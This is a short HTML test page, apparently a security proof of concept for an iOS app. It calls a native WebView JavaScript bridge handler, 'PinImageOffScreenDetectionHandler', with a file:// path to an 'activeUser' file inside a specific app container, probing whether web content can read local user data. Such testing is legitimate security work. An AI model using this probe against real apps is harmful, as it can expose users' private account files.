<!DOCTYPE html>
<html>
<head>
  <title>Test Access ActiveUser File via JS Bridge</title>
</head>
<body>
  <h1>Test ActiveUser File Access</h1>
  <button onclick="readActiveUser()">Read activeUser File</button>

  <script>
    function readActiveUser() {
      try {
        window.webkit.messageHandlers.PinImageOffScreenDetectionHandler.postMessage({
          url: "file:///var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/Documents/activeUser"
        });
        alert("Request sent to PinImageOffScreenDetectionHandler");
      } catch(e) {
        alert("Error: " + e.message);
      }
    }
  </script>
</body>
</html>
